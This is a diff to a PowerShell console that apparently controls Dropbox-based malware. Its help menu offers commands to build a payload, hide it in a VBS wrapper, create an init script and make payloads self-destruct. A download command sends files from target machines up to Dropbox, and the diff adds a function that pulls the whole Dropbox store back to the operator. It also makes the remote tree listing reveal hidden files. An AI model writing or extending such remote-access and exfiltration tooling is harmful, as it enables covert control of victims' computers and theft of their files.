@@ -25,6 +25,7 @@ function Show-Help {
     Write-Host "  download         - Download a file" -ForegroundColor White
     Write-Host "  selfdestruct /pc - Self destruct payloads" -ForegroundColor White
     Write-Host ""
+    Write-Host "  repo             - Downloads the whole dropbox repository" -ForegroundColor White
     Write-Host "  deploy           - Create the payload" -ForegroundColor White
     Write-Host "  wrap             - Create a vbs file that hides the payload" -ForegroundColor White
     Write-Host "  init             - Create the init script" -ForegroundColor White
@@ -315,6 +316,123 @@ function Send-SelfDestruct {
 
         Write-Host "File uploaded successfully" -ForegroundColor DarkGreen
         Write-Host "Path: $($uploadResponse.path_display)" -ForegroundColor White
+
+    } catch {
+        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
+        if ($_.ErrorDetails.Message) {
+            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
+        }
+    }
+
+    Write-Host ""
+}
+
+function Repo-Download {
+    param(
+        [string]$RemotePath = "",
+        [string]$LocalPath = ".\Repo"
+    )
+
+    if (-not $CurrentProfile) {
+        Write-Host "No profile selected" -ForegroundColor DarkRed
+        return 
+    }
+
+    try {
+        Write-Host "Getting access token..." -ForegroundColor White
+
+        $tokenUri = "https://api.dropbox.com/oauth2/token"
+        $body = @{
+            grant_type = "refresh_token"
+            refresh_token = $CurrentProfile.RefreshToken
+            client_id = $CurrentProfile.AppKey
+            client_secret = $CurrentProfile.AppSecret
+        }
+
+        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
+        $accessToken = $response.access_token
+
+        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen
+
+        if (!(Test-Path $LocalPath)) {
+            New-Item -ItemType Directory -Path $LocalPath -Force
+        }
+
+        $listUri = "https://api.dropboxapi.com/2/files/list_folder"
+        $downloadUri = "https://content.dropboxapi.com/2/files/download"
+
+        $listHeaders = @{
+            Authorization = "Bearer $accessToken"
+            "Content-Type" = "application/json"
+        }
+
+        $listBody = @{path = $RemotePath; recursive = $true} | ConvertTo-Json
+        Write-Host "Listing Dropbox contents from: $RemotePath" -ForegroundColor White
+
+        $response = Invoke-RestMethod -Uri $listUri -Method Post -Headers $listHeaders -Body $listBody
+        $entries = $response.entries
+
+        Write-Host "Found $($entries.Count) items to download" -ForegroundColor DarkGreen
+
+        $downloadedFiles = 0
+        $createdFolders = 0
+        $failedDownloads = 0
+
+        foreach ($entry in $entries) {
+            $remoteItemPath = $entry.path_display
+            $localItemPath = Join-Path $LocalPath ($remoteItemPath.TrimStart('/'))
+
+            if ($entry.'.tag' -eq 'folder') {
+                if (!(Test-Path $localItemPath)) {
+                    New-Item -ItemType Directory -Path $localItemPath -Force | Out-Null
+                    $createdFolders++
+                }
+                Write-Host "Created folder: $localItemPath" -ForegroundColor DarkGreen
+            } else {
+                $fileDir = Split-Path $localItemPath -Parent
+                if (!(Test-Path $fileDir)) {
+                    New-Item -ItemType Directory -Path $fileDir -Force | Out-Null
+                }
+
+                $apiArg = @{path = $remoteItemPath}
+                $apiArgJson = $apiArg | ConvertTo-Json -Compress
+
+                $downloadHeaders = @{
+                    Authorization = "Bearer $accessToken"
+                    "Dropbox-API-Arg" = $apiArgJson
+                    "Content-Type" = "application/octet-stream"
+                }
+
+                try {
+                    $response = Invoke-WebRequest -Uri $downloadUri -Method Post -Headers $downloadHeaders
+
+                    [System.IO.File]::WriteAllBytes($localItemPath, $response.Content)
+                    $downloadedFiles++
+
+                    $fileSize = if ($response.Headers['Dropbox-API-Result']) {
+                        $result = $response.Headers['Dropbox-API-Result'] | ConvertFrom-Json
+                        "$([math]::Round($result.size/1KB, 2)) KB"
+                    } else {
+                        "$([math]::Round($response.Content.Length/1KB, 2)) KB"
+                    }
+
+                    Write-Host "Downloaded: $localItemPath ($fileSize)" -ForegroundColor DarkGreen
+                } catch {
+                    $failedDownloads++
+                    Write-Host "Failed to download $remoteItemPath`: $($_.Exception.Message)" -ForegroundColor DarkRed
+                    if ($_.Exception.Response) {
+                        $statusCode = $_.Exception.Response.StatusCode.value__
+                        Write-Host "HTTP Status: $statusCode" -ForegroundColor Red
+                    }
+                }
+
+                Start-Sleep -Milliseconds 200
+            }
+        }
+
+        Write-Host "Files downloaded: $downloadedFiles" -ForegroundColor White
+        Write-Host "Folders created: $createdFolders" -ForegroundColor White
+        Write-Host "Failed downloads: $failedDownloads" -ForegroundColor $(if ($failedDownloads -gt 0) { "DarkRed" } else { "White" })
 
     } catch {
         Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
@@ -873,7 +991,7 @@ function Cmd-Tree {
 function Get-TreeStructure {
 param(`$Path, `$IndentLevel = 0)
 `$output = @()
-`$items = Get-ChildItem -Path `$Path | Sort-Object Name
+`$items = Get-ChildItem -Path `$Path -Force -ErrorAction "SilentlyContinue" | Sort-Object Name
 foreach (`$item in `$items) {
 `$indent = "  " * `$IndentLevel
 if (`$item.PSIsContainer) {
@@ -937,7 +1055,7 @@ function Cmd-Download {
     }
     $filePath = $filePath -replace '"', ''
 
-    $downloadCommand = @"
+    $command = @"
 # CMD-DOWNLOAD
 `$filePath = "$filePath"
 if (Test-Path `$filePath) {
@@ -954,7 +1072,7 @@ Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$fileContent
 }
 "@
 
-    Send-Command -CommandString $downloadCommand
+    Send-Command -CommandString $command
 }
 
 $exitRequested = $false
@@ -1020,6 +1138,9 @@ while (-not $exitRequested) {
                 $targetComputer = $Args -replace '^/+', ''
             }
             Send-SelfDestruct -TargetComputer $targetComputer
+        }
+        "^(repo|repository|rep|clone)$" {
+            Repo-Download
         }
         "^(deploy|d|payload)$" {
             Deploy-Script
